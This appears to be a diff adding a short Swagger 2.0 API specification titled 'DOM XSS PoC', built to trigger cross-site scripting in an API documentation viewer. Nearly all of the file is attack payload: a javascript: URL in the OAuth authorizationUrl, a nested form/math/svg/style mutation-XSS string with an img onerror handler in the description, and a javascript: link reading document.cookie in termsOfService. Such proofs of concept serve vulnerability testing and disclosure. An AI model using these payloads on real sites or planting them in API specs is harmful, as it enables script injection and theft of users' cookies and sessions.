@@ -1,0 +1,16 @@
+swagger: '2.0'
+	securityDefinitions:
+	  a:
+	    type: oauth2
+	    authorizationUrl: javascript:alert(document.domain)//
+	info:
+	  version: "0.0.1"
+	  title: DOM XSS PoC
+	  description: '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(document.domain) src>">'
+	  termsOfService: "javascript:alert(document.cookie)"
+	paths:
+	  /:
+	    get:
+	      responses:
+	        200:
+	          description: Echo GET
